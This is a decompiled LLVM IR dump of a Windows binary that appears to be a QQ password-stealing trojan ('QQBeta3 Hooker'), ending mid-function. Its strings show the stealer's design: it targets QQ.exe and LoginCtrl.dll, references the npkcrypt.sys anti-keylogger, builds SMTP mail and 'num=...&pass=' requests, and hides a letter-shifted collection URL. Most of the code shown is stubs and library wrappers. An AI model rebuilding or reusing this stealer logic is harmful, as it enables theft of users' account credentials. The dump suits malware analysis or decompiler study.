source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_404c5c = local_unnamed_addr constant i32 43
@global_var_404c74 = constant i32 37
@global_var_404cfc = local_unnamed_addr constant i32 63
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_404dc0 = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_404dc4 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4080f8 = global i32 1
@global_var_404de0 = constant [10 x i8] c"First Run\00"
@global_var_404e9c = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_404eb8 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_404f64 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_404f74 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405238 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 4215688
@B64EncodeTable_at_405388 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405a60 = constant [6 x i8] c"HELO \00"
@global_var_405a70 = constant [3 x i8] c"\0D\0A\00"
@global_var_405a7c = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405a94 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405aac = constant i32 62
@global_var_405ab8 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405acc = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_405adc = constant [8 x i8] c"From: <\00"
@global_var_405aec = constant [6 x i8] c"To: <\00"
@global_var_405afc = constant [10 x i8] c"Subject: \00"
@global_var_405b10 = constant i32 46
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_405b1c = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_405b66 = local_unnamed_addr constant i32 763609949
@global_var_405c88 = constant [7 x i8] c"#32770\00"
@global_var_405c98 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_405ce4 = local_unnamed_addr constant i32 4218088
@global_var_405ce8 = local_unnamed_addr constant i32 841875985
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_408100 = local_unnamed_addr global i32 4218380
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406008 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408104 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408108 = local_unnamed_addr global i32 0
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_406320 = constant [6 x i8] c"Down(\00"
@global_var_406330 = constant i32 41
@global_var_40633c = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_406340 = constant [5 x i8] c"Open\00"
@global_var_4096d0 = global i32 0
@global_var_406604 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406610 = constant i32 47
@global_var_406650 = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_40665c = constant [5 x i8] c"num=\00"
@global_var_40666c = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_40667c = local_unnamed_addr constant [33 x i8] c"iuuq;00ofx=43992=dpn0ofx0ofx=btq\00"
@global_var_406754 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406764 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406874 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406884 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_40688c = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_4096dc = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_406b00 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406b14 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_406b20 = local_unnamed_addr constant i32 47
@global_var_40690c = local_unnamed_addr constant i32 4221200
@global_var_406910 = local_unnamed_addr constant i32 841875985
@global_var_406c40 = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_406c54 = constant i32 47
@global_var_406c60 = constant [3 x i8] c"\0D\0A\00"
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_407238 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_4072e4 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_40746c = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_407478 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096d0
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_4096f0 = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 0
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_407958 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_40797c = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_407a10 = constant [11 x i8] c"user32.dll\00"
@global_var_407a1c = constant [11 x i8] c"LoadImageA\00"
@global_var_407a28 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_407608 = local_unnamed_addr constant i32 4224596
@global_var_407654 = local_unnamed_addr constant i32 1867011080
@global_var_407a38 = constant [12 x i8] c"LoadStringA\00"
@global_var_407a44 = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_407a50 = constant [12 x i8] c"shell32.dll\00"
@global_var_407a5c = constant [14 x i8] c"ShellExecuteA\00"
@global_var_407a6c = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_40810d = local_unnamed_addr global i32 0
@global_var_4096f4 = local_unnamed_addr global i32 0
@global_var_407b08 = local_unnamed_addr constant i32 30
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_407ea8 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_407eb8 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407ed0 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407ee8 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407ef8 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407f08 = constant [8 x i8] c"ListBox\00"
@global_var_409808 = global i32 0
@global_var_407f18 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f8 = external global i8*

declare i32 @unknown_4e40() local_unnamed_addr

declare i32 @unknown_4f18() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
  store i32 %5, i32* %3, align 4, !insn.addr !85
